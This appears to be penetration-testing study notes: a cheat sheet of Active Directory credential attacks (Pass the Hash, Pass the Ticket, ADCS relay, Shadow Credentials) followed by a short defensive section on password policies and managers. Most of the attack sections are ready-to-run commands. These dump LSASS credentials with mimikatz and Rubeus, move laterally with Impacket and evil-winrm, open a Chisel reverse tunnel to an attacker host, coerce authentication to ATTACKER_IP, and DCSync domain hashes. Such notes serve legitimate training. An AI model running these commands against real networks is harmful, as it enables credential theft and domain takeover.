mimikatz.exe privilege::debug "sekurlsa::pth /user:<USERNAME> /rc4:<HASH> /domain:<TARGET_DOMAIN> /run:cmd.exe" exit
```

### Pass the Hash with PowerShell Invoke-TheHash (Windows)

Local admin not required client-side; the user/hash must have admin rights on the target.

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TARGET_IP> -Domain <TARGET_DOMAIN> -Username <USERNAME> -Hash <HASH> -Command "<CMD>" -Verbose
Invoke-WMIExec -Target <TARGET_IP> -Domain <TARGET_DOMAIN> -Username <USERNAME> -Hash <HASH> -Command "<CMD>"
```

SMB and WMI execution methods via .NET TCPClient, NTLMv2 auth using the hash.

### Pass the Hash with Impacket (Linux)

```bash
impacket-psexec <USERNAME>@<TARGET_IP> -hashes :<HASH>
```

Other Impacket PtH tools: impacket-wmiexec, impacket-atexec, impacket-smbexec

### Pass the Hash with NetExec (Linux)

```bash
netexec smb <TARGET_IP>/24 -u <USERNAME> -d . -H <HASH>
```

`--local-auth` restrict to local admin account across a subnet (useful for checking local admin password reuse, e.g. gold-image environments). `(Pwn3d!)` = local admin confirmed.

```bash
netexec smb <TARGET_IP> -u <USERNAME> -d . -H <HASH> -x <COMMAND>
```

`-x` execute a command.

Note: domain spraying with `-H` can trigger account lockout; use `--local-auth` for single-attempt local checks. Mitigation: LAPS (randomized/rotated local admin password).

### Pass the Hash with evil-winrm (Linux)

```bash
evil-winrm -i <TARGET_IP> -u <USERNAME> -H <HASH>
```

Domain accounts need the domain in the username (`user@domain`).

### Pass the Hash with RDP (Linux)

Requires Restricted Admin Mode enabled (disabled by default).

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<HASH>
```

#### UAC limits Pass the Hash for local accounts

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` = 0 restricts remote admin ops to RID-500 Administrator only; 1 allows other local admins too. `FilterAdministratorToken` (disabled by default) enrolls RID 500 in UAC protection if enabled, blocking remote PtH for that account even when renamed. Domain accounts with local admin rights are unaffected by these settings.

## Pass the Ticket (PtT) from Windows

Uses a stolen Kerberos ticket instead of an NTLM hash for lateral movement.

TGT (Ticket Granting Ticket) obtained first by encrypting a timestamp with the user's password hash; permits requesting TGS tickets. TGS (Ticket Granting Service) requested per-service from the KDC using the TGT, then presented to that service.

### Harvesting Kerberos tickets from Windows

Tickets are processed/stored by LSASS. Non-admins can only get their own tickets; local admin can collect all.

```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

Exports `.kirbi` files. Tickets ending `$` = computer account; `username@service-domain.kirbi` = user ticket. `krbtgt` service = that account's TGT.

```cmd
Rubeus.exe dump /nowrap
```

Prints tickets Base64-encoded instead of files. `/nowrap` avoids line wrapping for copy-paste. Requires admin for all-user dump.

Note: on some Windows 10 builds with Mimikatz 2.2.0, `sekurlsa::ekeys` may show wrong `des_cbc_md4` hashes, breaking `sekurlsa::tickets /export` — Rubeus export is a working alternative in that case.

### Pass the Key aka. OverPass the Hash

Converts a user's NTLM/AES hash into a full TGT without touching the NTLM protocol directly.

```cmd
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

Dumps all Kerberos key types (aes256_hmac, rc4_hmac_nt, etc.) for logged-on users.

```cmd
sekurlsa::pth /domain:<TARGET_DOMAIN> /user:<USERNAME> /ntlm:<HASH>
```

Opens a new cmd.exe with the forged ticket context. Requires admin.

```cmd
Rubeus.exe asktgt /domain:<TARGET_DOMAIN> /user:<USERNAME> /aes256:<HASH> /nowrap
```

`/rc4` `/aes128` `/aes256` `/des` accepted key types. Rubeus does not require admin, unlike Mimikatz for this technique.

Note: modern domains (functional level 2008+) default to AES; using rc4_hmac in a Kerberos exchange may trigger "encryption downgrade" detection.

### Pass the Ticket (PtT)

```cmd
Rubeus.exe asktgt /domain:<TARGET_DOMAIN> /user:<USERNAME> /rc4:<HASH> /ptt
```

`/ptt` imports the ticket directly into the current logon session.

```cmd
Rubeus.exe ptt /ticket:<TARGET_FILE>.kirbi
```

Imports a ticket from a `.kirbi` file.

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<TARGET_FILE>.kirbi"))
```

Converts a `.kirbi` to Base64 for use with `/ticket:<base64>`.

```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "<TARGET_FILE>.kirbi"
```

Mimikatz PtT via `.kirbi` file. `misc::cmd` can spawn a new cmd window directly with the imported ticket instead of exiting back to the original prompt.

### Pass The Ticket with PowerShell Remoting (Windows)

PS Remoting needs admin rights, Remote Management Users membership, or explicit session config permissions. Listens on TCP/5985 (HTTP) / TCP/5986 (HTTPS).

```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "<TARGET_FILE>.kirbi"
exit
powershell
Enter-PSSession -ComputerName <TARGET_IP>
```

```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Creates a sacrificial logon session (Logon type 9), preserving the current session's TGTs. `/show` displays the process (default hidden).

```cmd
Rubeus.exe asktgt /user:<USERNAME> /domain:<TARGET_DOMAIN> /aes256:<HASH> /ptt
```

Run inside the sacrificial process, then connect via `Enter-PSSession -ComputerName <TARGET_IP>`.

## Pass the Ticket (PtT) from Linux

Linux hosts can join AD for centralized identity via Kerberos. Not a requirement to be domain-joined to use Kerberos tickets from Linux.

### Kerberos on Linux

Tickets commonly stored as ccache files in `/tmp`, path held in env var `KRB5CCNAME`. Keytab files hold principal+encrypted key pairs (derived from the Kerberos password) for passwordless authentication; must be recreated if the password changes. Keytabs are portable between systems.

### Identifying Linux and Active Directory integration

```bash
realm list
```

Shows domain, realm, permitted logins/groups if the Linux host is a Kerberos member.

```bash
ps -ef | grep -i "winbind\|sssd"
```

Alternative check for sssd/winbind if `realm` is unavailable.

### Finding Kerberos tickets in Linux

#### Finding KeyTab files

```bash
find / -name *keytab* -ls 2>/dev/null
```

Requires rw privileges on the file to use it. Default computer account keytab at `/etc/krb5.keytab` (root-only), impersonates the LINUX01$ computer account if accessible.

```bash
crontab -l
cat <SCRIPT_PATH>
```

Cronjob scripts may reference keytab files via `kinit` even without a `.keytab` extension.

#### Finding ccache files

```bash
env | grep -i krb5
```

Shows `KRB5CCNAME` path. Default location `/tmp`.

```bash
ls -la /tmp
```

Lists ccache files per logged-in user; root or privileged access needed to use another user's.

### Abusing KeyTab files

```bash
klist -k -t <TARGET_FILE>.keytab
```

Shows which principal a keytab belongs to.

```bash
kinit <USERNAME>@<TARGET_DOMAIN> -k -t <TARGET_FILE>.keytab
klist
```

Impersonates the keytab's user. `kinit` is case-sensitive: username lowercase, realm uppercase.

Note: save a copy of the current ccache (from `KRB5CCNAME`) before importing a keytab, to preserve the original session's ticket.

```bash
smbclient //<TARGET_IP>/<SHARE> -k -c ls
```

Confirms access using the imported ticket.

### KeyTab Extract

```bash
python3 /opt/keytabextract.py <TARGET_FILE>.keytab
```

Extracts realm, SPN, encryption type, NTLM/AES128/AES256 hashes from a 502-type keytab. NTLM hash enables PtH; AES hashes enable ticket forging or offline cracking (e.g. via crackstation.net for NTLM).

```bash
su - <USERNAME>@<TARGET_DOMAIN>
```

Log in as the cracked user.

### Abusing KeyTab ccache

Requires read privileges on the ccache file (owner or root).

```bash
sudo -l
sudo su
```

Check/escalate sudo privileges if available.

```bash
id <USERNAME>@<TARGET_DOMAIN>
```

Check group membership (e.g. Domain Admins) of a user with a cached ticket.

```bash
klist
cp <TARGET_FILE> .
export KRB5CCNAME=<TARGET_FILE>
klist
smbclient //<TARGET_IP>/<SHARE> -k -c ls -no-pass
```

Imports another user's ccache into the current session by setting `KRB5CCNAME`.

Note: ccache tickets are temporary — check "valid starting"/"expires" via `klist`, as login/logout cycles can invalidate them.

### Using Linux attack tools with Kerberos

On a domain-joined host, ensure `KRB5CCNAME` points to the desired ccache. From a non-domain attack host, proxy traffic via a domain-joined pivot (Chisel + Proxychains) and hardcode `/etc/hosts` entries.

```bash
cat /etc/hosts
```

```text
<DC_IP> <TARGET_DOMAIN> <COMPUTER> dc01.<TARGET_DOMAIN> dc01
<PIVOT_IP> ms01.<TARGET_DOMAIN> ms01
```

```bash
cat /etc/proxychains.conf
```

```text
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse
```

Sets up the Chisel reverse tunnel server on the attack host.

```cmd
c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
```

Run from the Windows pivot to connect back.

```bash
export KRB5CCNAME=<TARGET_FILE>
```

Point to the transferred ccache file before using Kerberos-aware tools.

#### Impacket

```bash
proxychains impacket-wmiexec <COMPUTER> -k
```

`-k` use Kerberos; target must be specified by hostname (not IP). `-no-pass` if prompted for a password.

#### Evil-WinRM

```bash
sudo apt-get install krb5-user -y
```

Set realm = `<TARGET_DOMAIN>` (uppercase), KDC = the DC hostname.

```bash
cat /etc/krb5.conf
```

```text
[libdefaults]
        default_realm = <TARGET_DOMAIN>
[realms]
    <TARGET_DOMAIN> = {
        kdc = dc01.<TARGET_DOMAIN>
    }
```

```bash
proxychains evil-winrm -i dc01 -r <TARGET_DOMAIN>
```

### Miscellaneous

```bash
impacket-ticketConverter <TARGET_FILE> <OUTPUT_FILE>.kirbi
```

Converts ccache ↔ kirbi in either direction (output extension determines direction).

```cmd
C:\tools\Rubeus.exe ptt /ticket:c:\tools\<TARGET_FILE>.kirbi
klist
```

Imports a converted ticket into a Windows session.

### Linikatz

Requires root. Extracts credentials/tickets across Kerberos implementations (FreeIPA, SSSD, Samba, Vintella, etc.), output saved to a `linikatz.*` folder in ccache/keytab formats.

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```

## Pass the Certificate

PKINIT extends Kerberos to support public-key-based initial authentication (e.g. smart card logon). Pass-the-Certificate uses X.509 certs to obtain TGTs, often alongside AD CS or Shadow Credential attacks.

### AD CS NTLM Relay Attack (ESC8)

NTLM relay attack against an ADCS HTTP web enrollment endpoint (`/CertSrv`), which is HTTP by default.

```bash
impacket-ntlmrelayx -t http://<TARGET_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

`--template` value varies by environment; enumerate via certipy.

```bash
python3 printerbug.py <TARGET_DOMAIN>/<USERNAME>:"<PASSWORD>"@<DC_IP> <ATTACKER_IP>
```

Coerces a machine account (needs Print Spooler running) to authenticate to the attacker host for relay.

```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

```bash
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

Fixes "Error detecting the version of libcrypto" if encountered.

```bash
python3 gettgtpkinit.py -cert-pfx <TARGET_FILE>.pfx -dc-ip <DC_IP> '<TARGET_DOMAIN>/<COMPUTER>$' <OUTPUT_FILE>.ccache
```

Obtains a TGT from the relayed certificate.

```bash
export KRB5CCNAME=<OUTPUT_FILE>.ccache
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user <USERNAME> '<TARGET_DOMAIN>/<COMPUTER>$'@dc01.<TARGET_DOMAIN>
```

DCSync using the DC machine account's TGT.

### Shadow Credentials (msDS-KeyCredentialLink)

Abuses the `msDS-KeyCredentialLink` attribute (stores PKINIT public keys) on a victim user. BloodHound's `AddKeyCredentialLink` edge indicates write access enabling takeover.

```bash
pywhisker --dc-ip <DC_IP> -d <TARGET_DOMAIN> -u <USERNAME> -p '<PASSWORD>' --target <USERNAME_2> --action add
```

Generates a cert, writes its public key to the target's `msDS-KeyCredentialLink`, outputs a password-protected PFX.

```bash
python3 gettgtpkinit.py -cert-pfx <TARGET_FILE>.pfx -pfx-pass '<PASSWORD>' -dc-ip <DC_IP> <TARGET_DOMAIN>/<USERNAME_2> <OUTPUT_FILE>.ccache
```

```bash
export KRB5CCNAME=<OUTPUT_FILE>.ccache
klist
evil-winrm -i dc01.<TARGET_DOMAIN> -r <TARGET_DOMAIN>
```

Pass the ticket using the forged TGT (target needs e.g. Remote Management Users membership for WinRM).

### No PKINIT?

If the KDC doesn't support the needed EKU for a victim (e.g. a DC machine account), PassTheCert authenticates to LDAPS directly with the certificate instead, enabling actions like password changes or granting DCSync rights.

## Password Policies

A password policy defines creation, storage, management, and transmission rules across the password lifecycle. Enforcement is the technical mechanism applying those rules (e.g. AD GPO).

Relevant standards: NIST SP800-63B, CIS Password Policy Guide, PCI DSS. Current guidance trends toward disabling forced password expiration, since it drives predictable weak patterns (e.g. incrementing a digit).

### Sample password policy

Minimum 8 characters; uppercase + lowercase; at least one number; at least one special character; not the username; changed every 60 days.

Policy-compliant passwords (e.g. `Inlanefreight01!`) can still be weak if they contain the company name or predictable increments. Recommended blacklist terms: company name, company-associated words, month names, season names, variations of "welcome"/"password", common guessable words ("password", "123456", "abcde").

## Password Managers

Password manager: app that stores credentials in an encrypted database, typically using a master password to derive encryption keys.

### Cloud password managers

Synchronize encrypted vaults across devices; typically offer mobile app + browser extension. Bitwarden's model (representative of the category):

Master key (derived from master password via KDF) → Master password hash (authenticates to the cloud service) → Decryption key (symmetric key derived from master key, decrypts vault items)

This supports Zero-Knowledge Encryption (provider cannot access vault contents).

Popular: 1Password, Bitwarden, Dashlane, Keeper, Lastpass, NordPass, RoboForm

### Local password managers

Store the database locally; user is responsible for protecting it. Use similar encryption + KDFs with random salt. Some add memory protection / keylogger resistance via a secure desktop (like UAC).

Popular: KeePass, KWalletManager, Pleasant Password Server, Password Safe

### Features

2FA support | Multi-platform (Android, iOS, Windows, Linux, Mac) | Browser extension | Login autocomplete | Import/export | Password generation

### Alternatives

MFA, FIDO2 (passwordless via physical devices like YubiKey), OTP, TOTP, IP restrictions, device compliance enforcement (Microsoft Endpoint Manager, Workspace ONE)

### Going passwordless

Replaces the knowledge factor (password) with a possession factor (something you have) or inherent factor (something you are) for stronger assurance against theft, sharing, and reuse.